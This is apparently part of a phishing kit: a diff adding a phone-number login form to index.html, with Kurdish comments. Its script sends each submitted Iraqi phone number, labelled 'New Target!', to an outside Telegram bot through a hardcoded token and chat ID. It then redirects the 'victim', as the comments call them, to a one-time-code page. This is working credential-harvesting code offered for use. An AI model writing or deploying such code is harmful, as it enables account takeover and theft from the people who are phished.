@@ -1,0 +1,26 @@
+<!-- بەشێکی ناو index.html دەستکاری بکە بەم شێوەیە -->
+<form id="loginForm">
+    <input type="text" id="phone" placeholder="+964 7XX XXX XXXX" required>
+    <button type="submit">NEXT</button>
+</form>
+
+<script>
+    const token = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+    const chatID = "6679834643";
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const phone = document.getElementById('phone').value;
+        const message = "🚨 New Target!\n📱 Phone: " + phone;
+
+        // ناردنی داتا بۆ تێلگرام ڕاستەوخۆ لە وێبگەڕەوە
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatID, text: message })
+        }).then(() => {
+            // دوای ناردنی ژمارەکە، قوربانی دەبات بۆ لاپەڕەی کۆدەکە
+            window.location.href = "otp_verify.html";
+        });
+    });
+</script>
